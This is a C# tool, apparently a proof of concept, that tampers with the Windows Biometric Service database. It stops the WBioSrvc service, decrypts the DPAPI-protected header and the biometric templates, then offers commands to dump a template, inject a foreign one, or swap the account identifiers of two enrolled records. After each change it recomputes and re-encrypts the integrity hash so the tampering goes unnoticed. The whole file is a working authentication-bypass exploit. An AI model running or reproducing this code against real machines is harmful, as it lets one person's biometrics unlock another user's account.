using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using static NativeMethods;
using static Program;
using static System.Runtime.InteropServices.JavaScript.JSType;


public static class Constants
{
    public const int SECURITY_MAX_SID_SIZE = 68;
}

public static class BinaryStructHelper
{
    /// <summary>
    /// Reads raw bytes from a file at a given offset.
    /// </summary>
    public static byte[] ReadBytesFromFile(string filePath, int size, long offset = 0)
    {
        byte[] buffer = new byte[size];

        using FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read);
        fs.Seek(offset, SeekOrigin.Begin);
        int bytesRead = fs.Read(buffer, 0, size);
        if (bytesRead != size)
        {
            throw new InvalidOperationException($"Could not read full buffer. Expected {size} bytes, got {bytesRead}.");
        }

        return buffer;
    }

    /// <summary>
    /// Converts a byte array to a struct of type T.
    /// </summary>
    public static T FromBytes<T>(byte[] buffer) where T : struct
    {
        int size = Marshal.SizeOf<T>();
        if (buffer.Length < size)
        {
            throw new ArgumentException($"Buffer too small. Needs at least {size} bytes, got {buffer.Length}.");
        }

        GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
        try
        {
            return Marshal.PtrToStructure<T>(handle.AddrOfPinnedObject());
        }
        finally
        {
            handle.Free();
        }
    }

    /// <summary>
    /// Convenience method to read and parse a structure directly from a file.
    /// </summary>
    public static T ReadFromFile<T>(string filePath, long offset = 0) where T : struct
    {
        int size = Marshal.SizeOf<T>();
        byte[] buffer = ReadBytesFromFile(filePath, size, offset);
        return FromBytes<T>(buffer);
    }

    public static string ToReadableString<T>(T obj) where T : struct
    {
        var sb = new StringBuilder();
        Type type = typeof(T);
        sb.AppendLine($"{type.Name} {{");

        foreach (FieldInfo field in type.GetFields(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance))
        {
            object value = field.GetValue(obj);

            string formattedValue = value switch
            {
                byte[] byteArray => BitConverter.ToString(byteArray).Replace("-", ""),
                //WINBIO_IDENTITY identify => SidHelper.ParseSid(identify),
                _ => value?.ToString() ?? "null"
            };

            sb.AppendLine($"  {field.Name}: {formattedValue}");
        }

        sb.Append("}");
        return sb.ToString();
    }
}


public static class NativeMethods
{
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool ConvertSidToStringSid(IntPtr pSid, out IntPtr ptrSidString);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LocalFree(IntPtr hMem);

    // Define the CRYPTOAPI_BLOB structure
    [StructLayout(LayoutKind.Sequential)]
    public struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    // Define the  BCRYPT_KEY_DATA_BLOB_HEADER stucutre 
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct BCRYPT_KEY_DATA_BLOB_HEADER
    {
        public uint dwMagic;
        public uint dwVersion;
        public uint cbKeyData;

        public override string ToString()
        {
            return $"dwMagic: {dwMagic:X}, dwVersion: {dwVersion}, cbKeySize: {cbKeyData}";
        }
    }

    // Import CryptUnprotectData from crypt32.dll
    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        StringBuilder ppszDataDescr,
        IntPtr pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPromptStruct,
        int dwFlags,
        ref DATA_BLOB pDataOut);

    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CryptProtectData(
        ref DATA_BLOB pDataIn,
        string szDataDescr,
        IntPtr pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPromptStruct,
        int dwFlags,
        out DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct WINBIO_IDENTITY
    {
        public uint Type; // Should always be 3 for AccountSid
        public uint SidSize;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = Constants.SECURITY_MAX_SID_SIZE)]
        public byte[] SidData;

        public override string ToString()
        {
            return new SecurityIdentifier(SidData, 0).ToString();
        }
    }
}



[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct LockBoxProtectedData
{
    public BCRYPT_KEY_DATA_BLOB_HEADER HeaderKeyDataBlob;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 48)]
    public byte[] KeyDataBlob;
    public uint Alignment;
    public uint SizeHash;
    public uint SizeKey;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
    public byte[] HashDigest;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public byte[] IV;

    /// <summary>
    /// Parse LockBoxProtectedData from a database file. This takes care of decryption. 
    /// </summary>
    /// <param name="filePath">Database filename and path</param>
    /// <param name="headerOffset">Offset to the header, should be zero.</param>
    /// <returns></returns>
    public static LockBoxProtectedData FromFile(string filePath, long headerOffset = 0)
    {
        var decryptedBlob = DecryptBlobFromFile(filePath);
        return BinaryStructHelper.FromBytes<LockBoxProtectedData>(decryptedBlob);
    }


    /// <summary>
    /// Read DPAPI protected blob from database file and return the decrypted bytes. 
    /// </summary>
    /// <param name="filename">The database file to read and decrypt the data from</param>
    /// <returns>The decrypted bytes.</returns>
    /// <exception cref="InvalidDataException"></exception>
    private static byte[] DecryptBlobFromFile(string filename)
    {
        const int readSize = 0x400;
        // Open the file and read the first 0x400 bytes
        byte[] outBuffer = new byte[readSize];
        using (FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read))
        {
            int bytesRead = fs.Read(outBuffer, 0, readSize);

            // Check if we can read the size field
            if (bytesRead < 4)
            {
                throw new InvalidDataException("File too small to contain a length field.");
            }
        }

        // Parse the first DWORD as the length
        int dataLength = BitConverter.ToInt32(outBuffer, 0);

        if (dataLength <= 0 || dataLength > (outBuffer.Length - 4))
        {
            throw new InvalidDataException($"Invalid data length: {dataLength}");
        }

        // Prepare the DATA_BLOB
        NativeMethods.DATA_BLOB inputBlob = new NativeMethods.DATA_BLOB();
        inputBlob.cbData = dataLength;
        inputBlob.pbData = Marshal.AllocHGlobal(dataLength);
        Marshal.Copy(outBuffer, 4, inputBlob.pbData, dataLength);

        NativeMethods.DATA_BLOB outputBlob = new NativeMethods.DATA_BLOB();

        // Call CryptUnprotectData
        bool success = NativeMethods.CryptUnprotectData(
            ref inputBlob,
            null,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero,
            0,
            ref outputBlob);

        // Free input memory
        Marshal.FreeHGlobal(inputBlob.pbData);

        if (!success)
        {
            // Free output memory
            Marshal.FreeHGlobal(outputBlob.pbData);
            throw new InvalidDataException("CryptUnprotectData failed. Error: " + Marshal.GetLastWin32Error());
        }

        // Copy decrypted data
        byte[] decrypted = new byte[outputBlob.cbData];
        Marshal.Copy(outputBlob.pbData, decrypted, 0, outputBlob.cbData);

        // Free output memory
        Marshal.FreeHGlobal(outputBlob.pbData);
        return decrypted;
    }

    public override string ToString() => BinaryStructHelper.ToReadableString(this);
}

[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct LockBoxFileHeader
{
    public Guid GuidDatabase;
    public ulong Version;
    public Guid DatabaseID;
    public uint Factor;
    public Guid Format;
    public uint Alignment;
    public ulong IndexElementCount;
    public ulong TotalRecordCount;
    public ulong DeletedRecordCount;
    public ulong MaxAvailableRecords;
    public long FirstFreeByte; // LARGE_INTEGER is a signed 64-bit value
    public ulong Reserved01;
    public ulong Reserved02;

    /// <summary>
    /// Parse LockBoxFileHeader from file, should start at 0x400
    /// </summary>
    /// <param name="filePath">Filepath of the database file</param>
    /// <param name="headerOffset">Offset of the header, should default to 0x400</param>
    /// <returns></returns>
    public static LockBoxFileHeader FromFile(string filePath, int headerOffset = 0x400)
    {
        return BinaryStructHelper.ReadFromFile<LockBoxFileHeader>(filePath, headerOffset);
    }
    public override string ToString() => BinaryStructHelper.ToReadableString(this);
}

[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct LockBoxRecordHeader
{
    public Guid MagicGUID;
    public ulong Flags;
    public ulong RecordSize; // RecordSize = LastEntryOffset + EncryptedTemplateBlobSize
    public ulong LastEntryOffset; // size of the header so 152
    public ulong TemplateBlobSize; // The size of the decrypted template so no padding!
    public ulong EncryptedTemplateBlobSize; // The size of the encypted template, this includes the padding!
    public ulong PayloadBlobSize; // 0
    public ulong IndexElementCount; // 0
    public WINBIO_IDENTITY Identity;
    public byte SubFactor;

    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
    public byte[] Alignment;

    public static LockBoxRecordHeader FromFile(string filePath, long offset)
    {
        return BinaryStructHelper.ReadFromFile<LockBoxRecordHeader>(filePath, offset);
    }

    public override string ToString() => BinaryStructHelper.ToReadableString(this);

}

class Program
{

    // Helper to print hex dump
    static void HexDump(byte[] bytes, int bytesPerLine = 16, int maxLines = -1)
    {
        for (int i = 0; i < bytes.Length; i += bytesPerLine)
        {
            Console.Write($"{i:X8}  ");
            for (int j = 0; j < bytesPerLine; j++)
            {
                if (i + j < bytes.Length)
                    Console.Write($"{bytes[i + j]:X2} ");
                else
                    Console.Write("   ");
            }

            Console.Write(" ");
            for (int j = 0; j < bytesPerLine; j++)
            {
                if (i + j < bytes.Length)
                {
                    char c = (char)bytes[i + j];
                    Console.Write(char.IsControl(c) ? '.' : c);
                }
            }
            Console.WriteLine();
            if (i == maxLines * bytesPerLine)
            {
                return;
            }
        }
    }


    /// <summary>
    /// Computes the SHA256 of the unencrypted portion of a databasefile. This hash is saved in the encrypted header. 
    /// </summary>
    /// <param name="filePath">Filepath of the database file.</param>
    /// <returns>SHA256 hash of unecrypted portion of database</returns>
    /// <exception cref="InvalidOperationException"></exception>
    public static byte[] LockBoxComputeFileHash(string filePath)
    {
        const int skipBytes = 0x400; // 1024 bytes

        using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        {
            if (fs.Length <= skipBytes)
                throw new InvalidOperationException("File is too small to skip the header.");

            // Skip first 0x400 bytes
            fs.Seek(skipBytes, SeekOrigin.Begin);

            using (SHA256 sha256 = SHA256.Create())
            {
                return sha256.ComputeHash(fs);
            }
        }
    }


    /// <summary>
    /// Updates a record with a new SID. 
    /// </summary>
    /// <param name="record">A record used as a reference. The Identiy field will be changed</param>
    /// <param name="identity">The Identity that will be replaced</param>
    /// <param name="filePath">Filepath of the dataabse file were to modification are done</param>
    /// <param name="offset">Offset to the record that should be changed</param>
    public static void UpdateSidAndWriteRecord(
        LockBoxRecordHeader record,
        WINBIO_IDENTITY identity,
        string filePath,
        long offset)
    {

        record.Identity = identity;

        // Marshal the updated struct into a byte buffer
        int structSize = Marshal.SizeOf<LockBoxRecordHeader>();
        byte[] buffer = new byte[structSize];
        GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
        Marshal.StructureToPtr(record, handle.AddrOfPinnedObject(), false);
        handle.Free();

        // Write the buffer back to the file at the specified offset
        using FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Write, FileShare.None);
        fs.Seek(offset, SeekOrigin.Begin);
        fs.Write(buffer, 0, buffer.Length);
    }

    public static void UpdateTemplateAndWriteRecord(LockBoxRecordHeader record, byte[] encryptedTemplate, ulong decryptedtemplateSize, string filePath, long headerOffset)
    {
        var newRecord = record;
        newRecord.TemplateBlobSize = decryptedtemplateSize;
        newRecord.EncryptedTemplateBlobSize = (ulong)encryptedTemplate.Length;
        newRecord.RecordSize = newRecord.EncryptedTemplateBlobSize + (ulong)Marshal.SizeOf<LockBoxRecordHeader>();


        // Marshal the updated struct into a byte buffer
        int structSize = Marshal.SizeOf<LockBoxRecordHeader>();
        byte[] buffer = new byte[structSize];
        GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
        Marshal.StructureToPtr(newRecord, handle.AddrOfPinnedObject(), false);
        handle.Free();

        // Write the Header back to the file at the specified offset
        using FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Write, FileShare.None);
        fs.Seek(headerOffset, SeekOrigin.Begin);
        fs.Write(buffer, 0, buffer.Length);

        // write the template back
        fs.Write(encryptedTemplate, 0, encryptedTemplate.Length);
    }

    /// <summary>
    /// Updates the hash of a database file. Takes also care of encryption. 
    /// </summary>
    /// <param name="referenceLockBoxHeader">The LockBoxHeader that should be taken as a reference. Only the hash will be changed.</param>
    /// <param name="newHash">The hash that should be placed in the header</param>
    /// <param name="filePath">Filepath of the database file</param>
    /// <exception cref="ArgumentException"></exception>
    /// <exception cref="Exception"></exception>
    public static void UpdateHashAndEncryptToFile(LockBoxProtectedData referenceLockBoxHeader, byte[] newHash, string filePath)
    {
        if (newHash == null || newHash.Length != 32)
            throw new ArgumentException("Hash must be 32 bytes long.");

        // Update HashDigest
        Array.Copy(newHash, referenceLockBoxHeader.HashDigest, 32);

        int structSize = Marshal.SizeOf<LockBoxProtectedData>();
        byte[] plainBytes = new byte[structSize];
        GCHandle handle = GCHandle.Alloc(plainBytes, GCHandleType.Pinned);
        Marshal.StructureToPtr(referenceLockBoxHeader, handle.AddrOfPinnedObject(), false);
        handle.Free();

        // Prepare input DATA_BLOB
        NativeMethods.DATA_BLOB inBlob = new NativeMethods.DATA_BLOB();
        NativeMethods.DATA_BLOB outBlob;

        IntPtr inPtr = Marshal.AllocHGlobal(plainBytes.Length);
        Marshal.Copy(plainBytes, 0, inPtr, plainBytes.Length);
        inBlob.cbData = plainBytes.Length;
        inBlob.pbData = inPtr;

        if (!NativeMethods.CryptProtectData(ref inBlob, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out outBlob))
        {
            Marshal.FreeHGlobal(inPtr);
            throw new Exception("CryptProtectData failed.");
        }

        try
        {
            // Copy encrypted data
            byte[] encryptedBytes = new byte[outBlob.cbData];
            Marshal.Copy(outBlob.pbData, encryptedBytes, 0, outBlob.cbData);

            // Write to file: first 4 bytes = length, then encrypted blob
            using FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Write);
            fs.Seek(0, SeekOrigin.Begin);
            using BinaryWriter bw = new BinaryWriter(fs);
            bw.Write(outBlob.cbData);              // write length as DWORD
            bw.Write(encryptedBytes);              // write blob data
        }
        finally
        {
            Marshal.FreeHGlobal(inPtr);
            NativeMethods.LocalFree(outBlob.pbData);
        }
    }

    /// <summary>
    /// Helper to find binary GUIDs in a file. 
    /// </summary>
    /// <param name="filePath"></param>
    /// <param name="guid"></param>
    public static void FindGuidOffsetsInFile(string filePath, Guid guid)
    {
        byte[] target = guid.ToByteArray(); // GUID in its binary form
        long offset = 0;
        const int bufferSize = 4096;

        using FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read);
        byte[] buffer = new byte[bufferSize + target.Length - 1]; // overlap to avoid boundary misses

        int bytesRead;
        while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
        {
            for (int i = 0; i <= bytesRead - target.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < target.Length; j++)
                {
                    if (buffer[i + j] != target[j])
                    {
                        match = false;
                        break;
                    }
                }

                if (match)
                    Console.WriteLine($"GUID found at offset: 0x{offset + i:X}");
            }

            // Rewind to overlap previous chunk
            offset += bytesRead - target.Length + 1;
            fs.Position = offset;
        }
    }

    static void StopWBioSrvc()
    // WBS holds a handle of the databasefile and we cannot chnage the data to it. so we need to terminate the service.
    // The service will automatically restart if an RPC is made to it. 
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "sc",
                Arguments = "stop WBioSrvc",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                process.WaitForExit();

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                //Console.WriteLine("sc output:");
                //Console.WriteLine(output);

                if (!string.IsNullOrEmpty(error))
                {
                    //Console.WriteLine("sc error:");
                    //Console.WriteLine(error);
                }
            }

            //Console.WriteLine("Sleeping for 2 seconds...");
            Thread.Sleep(2000); // Sleep for 2 seconds
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Exception: {ex.Message}");
        }
    }

    public static int FindPatternOffset(byte[] buffer, byte[] pattern)
    {
        if (buffer == null || pattern == null || pattern.Length == 0 || buffer.Length < pattern.Length)
            return -1;

        for (int i = 0; i <= buffer.Length - pattern.Length; i++)
        {
            bool match = true;
            for (int j = 0; j < pattern.Length; j++)
            {
                if (buffer[i + j] != pattern[j])
                {
                    match = false;
                    break;
                }
            }

            if (match)
                return i;
        }

        return -1; // Pattern not found
    }

    static void Main(string[] args)
    {

        StopWBioSrvc();
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: program.exe <filename>");
            return;
        }

        var databaseFilename = args[0];
        LockBoxProtectedData DecryptedLockBox = LockBoxProtectedData.FromFile(databaseFilename);


        Console.WriteLine("Calculated Hash:");
        var CalculatedHash = LockBoxComputeFileHash(databaseFilename);
        Console.WriteLine(BitConverter.ToString(CalculatedHash).Replace("-", ""));

        if (!CalculatedHash.SequenceEqual(DecryptedLockBox.HashDigest))
        {
            Console.WriteLine("[ERROR] Hashes do not match");
            return;
        }
        else
        {
            Console.WriteLine("[INFO] Hashes match proceeding");
        }

        Console.WriteLine(DecryptedLockBox);

        var lockBoxFileHeader = LockBoxFileHeader.FromFile(databaseFilename);
        Console.WriteLine(lockBoxFileHeader);

        var recordHeaderOffset = 0x400 + 0x78;
        var recordHeader = LockBoxRecordHeader.FromFile(databaseFilename, recordHeaderOffset);
        Console.WriteLine(recordHeader);


        // read the encrypted template
        long templateOffset = 0x400 + 0x78 + (long)recordHeader.LastEntryOffset;

        byte[] encryptedTemplate = new byte[recordHeader.EncryptedTemplateBlobSize];

        using (FileStream fs = new FileStream(databaseFilename, FileMode.Open, FileAccess.Read))
        {
            fs.Seek(templateOffset, SeekOrigin.Begin);
            fs.Read(encryptedTemplate, 0, encryptedTemplate.Length);
        }
        byte[] decryptedTemplate = AesCbcNative.DecryptTemplate(DecryptedLockBox.IV, DecryptedLockBox.KeyDataBlob, DecryptedLockBox.HeaderKeyDataBlob, encryptedTemplate); // needs to be the payload bytes!
        HexDump(decryptedTemplate, maxLines: 20);


        // 1D495BAEB1B2FEDFDEB48468BE1D1986E79B58986220707ADF4109E87AE7AD8A

        /*
        File.WriteAllBytes("C:\\Users\\user\\Desktop\\Decryptered.bytes", decryptedTemplate);

        byte[] pattern = new byte[] { 0x30, 0x31, 0x30 };
        int patternOffet = FindPatternOffset(decryptedTemplate, pattern);
        Console.WriteLine(patternOffet);
        if (patternOffet != -1)
        {
            Console.WriteLine("Found Pattern");
            byte[] slice = decryptedTemplate.Skip(patternOffet).ToArray();
            HexDump(slice,maxLines:20);
        }
        Console.WriteLine("Pattern not found!");
        */



        if (args.Length == 1)
        {
            return;
        }

        var command = args[1];

        if (args.Length == 3 && command == "dump")
        {
            File.WriteAllBytes(args[2], decryptedTemplate);
            return;
        }

        if (args.Length == 3 && command == "inject")
        {
            var templateFromFile = File.ReadAllBytes(args[2]);
            byte[] newEncryptedTamplte = AesCbcNative.EncryptTemplate(DecryptedLockBox.IV, DecryptedLockBox.KeyDataBlob, DecryptedLockBox.HeaderKeyDataBlob, templateFromFile);
            UpdateTemplateAndWriteRecord(recordHeader, newEncryptedTamplte, (ulong)templateFromFile.Length, databaseFilename, recordHeaderOffset);
            var UpdatedHash = LockBoxComputeFileHash(databaseFilename);
            UpdateHashAndEncryptToFile(DecryptedLockBox, UpdatedHash, databaseFilename);
            return;
        }

        if (lockBoxFileHeader.TotalRecordCount == 1)
        {
            return;
        }

        var recordHeader2 = LockBoxRecordHeader.FromFile(databaseFilename, (long)(0x400 + 0x78 + recordHeader.RecordSize));
        Console.WriteLine(recordHeader2);

        if (command == "swap")
        {
            UpdateSidAndWriteRecord(recordHeader, recordHeader2.Identity, databaseFilename, 0x400 + 0x78);
            UpdateSidAndWriteRecord(recordHeader2, recordHeader.Identity, databaseFilename, (long)(0x400 + 0x78 + recordHeader.RecordSize));

            var UpdatedHash = LockBoxComputeFileHash(databaseFilename);
            UpdateHashAndEncryptToFile(DecryptedLockBox, UpdatedHash, databaseFilename);

            Console.WriteLine("Original SID: " + recordHeader.Identity + "\nNew SID     : " + recordHeader2.Identity);
        }
    }
}
